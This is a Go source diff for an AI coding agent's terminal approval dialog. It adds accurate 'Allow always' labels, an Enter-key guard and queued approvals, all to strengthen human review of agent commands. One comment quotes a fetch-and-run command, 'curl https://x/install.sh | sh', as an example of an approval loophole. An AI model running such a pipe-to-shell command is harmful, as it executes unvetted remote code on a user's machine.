@@ -1,12 +1,15 @@
 package tui
 
 import (
+	"fmt"
 	"slices"
 	"strings"
+	"time"
 
 	tea "charm.land/bubbletea/v2"
 
 	"spettro/internal/agent"
+	"spettro/internal/remote"
 )
 
 // A person must be able to trust what they approve, so nothing an approval
@@ -64,7 +67,7 @@ func approvalActionLabel(a approvalAction, req agent.ShellApprovalRequest) strin
 	case approvalActAllowOnce:
 		return shellApprovalOptions[0]
 	case approvalActAllowAlways:
-		return shellApprovalOptions[1]
+		return approvalAlwaysLabel(req)
 	case approvalActDeny:
 		return shellApprovalOptions[2]
 	case approvalActInstead:
@@ -73,13 +76,79 @@ func approvalActionLabel(a approvalAction, req agent.ShellApprovalRequest) strin
 	return ""
 }
 
+// approvalAlwaysLabel is the "Allow always" row, saying what the choice
+// remembers (approvalRemembered). The plain label, "remember this command",
+// is only used when that is exactly what is remembered.
+func approvalAlwaysLabel(req agent.ShellApprovalRequest) string {
+	const allow = "Allow always  "
+	switch remembered := approvalRemembered(req); {
+	case approvalIsFileChange(req):
+		// The runtime asks about every file change, whatever was chosen
+		// before, so there is nothing to remember.
+		return allow + "(same as once)"
+	case approvalIsNetwork(req):
+		return allow + "(remember this target)"
+	case !approvalRemembersOther(req):
+		return shellApprovalOptions[1]
+	case len(remembered) == 1:
+		return allow + "(remember the command listed)"
+	default:
+		return fmt.Sprintf("%s(remember the %d commands listed)", allow, len(remembered))
+	}
+}
+
+// approvalRemembered is what choosing "Allow always" saves for req, the way
+// the runtime saves it (internal/agent): for a command, every segment that
+// needed approval (req.Segments, the parts a shell runs separately: each
+// side of a pipe, each line); for a network call, its target; for a file
+// change, nothing, since file changes are asked about every time. A command
+// request without segments remembers the command.
+//
+// The segments are not always the command the dialog shows. "go build &&
+// go test" remembers "go build" and "go test"; a heredoc remembers every
+// line of its body as if it were a command, so allowing
+// "cat > notes.md <<'EOF'" with a body line "curl https://x/install.sh | sh"
+// for always lets a later "curl https://x/install.sh | sh" run unasked. The
+// dialog therefore lists them whenever they differ (approvalRemembersOther).
+func approvalRemembered(req agent.ShellApprovalRequest) []string {
+	switch {
+	case approvalIsFileChange(req):
+		return nil
+	case approvalIsNetwork(req):
+		if fields := strings.Fields(req.Command); len(fields) >= 3 {
+			return []string{strings.Join(fields[2:], " ")}
+		}
+		return nil
+	case len(req.Segments) > 0:
+		return req.Segments
+	}
+	return []string{agent.RememberedCommandKey(req.Command)}
+}
+
+// approvalRemembersOther reports whether "Allow always" remembers something
+// other than exactly the command on the summary row: more than one segment,
+// or one that is not the whole command.
+func approvalRemembersOther(req agent.ShellApprovalRequest) bool {
+	if approvalIsFileChange(req) || approvalIsNetwork(req) || len(req.Segments) == 0 {
+		return false
+	}
+	return len(req.Segments) > 1 || req.Segments[0] != agent.RememberedCommandKey(req.Command)
+}
+
+// approvalIsNetwork reports whether req approves network access (the
+// runtime asks with the command "network <tool> <target>").
+func approvalIsNetwork(req agent.ShellApprovalRequest) bool {
+	label := formatApprovalCommandLabel(req.Command)
+	return !approvalIsFileChange(req) && label != "" && !strings.HasPrefix(label, "$ ")
+}
+
 // approvalReviewLabel names the review after what it shows: a file change's
 // diff, a network call's request, or a command.
 func approvalReviewLabel(req agent.ShellApprovalRequest) string {
 	switch {
 	case approvalIsFileChange(req):
 		return "Review full diff"
-	case !strings.HasPrefix(formatApprovalCommandLabel(req.Command), "$ "):
+	case approvalIsNetwork(req):
 		return "Review full request"
 	default:
 		return "Review full command"
@@ -175,6 +244,12 @@ func (m Model) updateShellApproval(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 		}
 	}
 	switch msg.String() {
+	case "enter":
+		if m.approvalEnterGuarded() {
+			return m, nil
+		}
+	}
+	switch msg.String() {
 	case "v":
 		return m.openApprovalReview(), nil
 	case "ctrl+o":
@@ -221,6 +296,23 @@ func (m Model) updateShellApproval(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 	return m, nil
 }
 
+// resolveShellApproval answers the approval on screen with decision. When
+// the run goes on (an allow), the next queued approval, if any, takes its
+// place; a deny interrupts the run, which denies the queued ones (stopAgent).
+// approvalEnterGuard is how long after an approval appears Enter does not
+// answer it. An approval can appear under a key already on its way: the
+// second press of a double Enter that answered the approval before it, when
+// a queued one takes its place, or the Enter that sends a message just as
+// the agent asks. Without the guard that press would approve a call nobody
+// has seen. It is far shorter than anyone takes to read a dialog.
+const approvalEnterGuard = 400 * time.Millisecond
+
+// approvalEnterGuarded reports whether Enter comes too soon after the
+// pending approval appeared to be meant for it (approvalEnterGuard).
+func (m Model) approvalEnterGuarded() bool {
+	return !m.approvalShownAt.IsZero() && time.Since(m.approvalShownAt) < approvalEnterGuard
+}
+
 func (m Model) resolveShellApproval(decision agent.ShellApprovalDecision, banner string) Model {
 	if m.pendingAuth != nil {
 		select {
@@ -232,8 +324,58 @@ func (m Model) resolveShellApproval(decision agent.ShellApprovalDecision, banner
 	m = m.resetApprovalUI()
 	m.ta.Reset()
 	m.showBanner(banner, "info")
+	if decision != agent.ShellApprovalDeny && len(m.approvalQueue) > 0 {
+		next := m.approvalQueue[0]
+		m.approvalQueue = m.approvalQueue[1:]
+		m = m.presentApproval(next)
+	}
 	m.refreshViewport()
 	return m
+}
+
+// presentApproval puts msg on screen as the pending approval, with a fresh
+// dialog (cursor, scroll, review closed), and tells every surface that
+// follows the TUI (desktop notification, remote clients, Telegram) about it.
+// A queued approval stays invisible to those surfaces until its turn, so
+// what they describe is always what the dialog shows.
+func (m Model) presentApproval(msg shellApprovalRequestMsg) Model {
+	m.pendingAuth = &msg
+	m = m.resetApprovalUI()
+	m.approvalShownAt = time.Now()
+	m.ta.Reset()
+	banner := "command approval required"
+	if n := len(m.approvalQueue); n > 0 {
+		banner = fmt.Sprintf("%s (%d more waiting after this one)", banner, n)
+	}
+	m.showBanner(banner, "warn")
+	m.notifyIfUnfocused("Agent is waiting for command approval")
+	m.publishRemote("approval_request", remote.ApprovalEvent(remote.ApprovalRequest{
+		ToolID:   msg.request.ToolID,
+		Command:  msg.request.Command,
+		Reason:   msg.request.Reason,
+		Segments: msg.request.Segments,
+		Diff:     msg.request.Diff,
+	}))
+	m.syncApprovalReview()
+	return m
+}
+
+// denyApproval answers msg with a denial without showing it, for a request
+// that can no longer be shown (its run is over or being stopped).
+func denyApproval(msg shellApprovalRequestMsg) {
+	select {
+	case msg.response <- shellApprovalResponse{decision: agent.ShellApprovalDeny}:
+	default:
+	}
+}
+
+// discardApprovalQueue denies every queued approval, so no tool call is left
+// waiting when the run they belong to goes away.
+func (m *Model) discardApprovalQueue() {
+	for _, queued := range m.approvalQueue {
+		denyApproval(queued)
+	}
+	m.approvalQueue = nil
 }
 
 // resetApprovalUI clears the dialog state that belongs to one approval (the
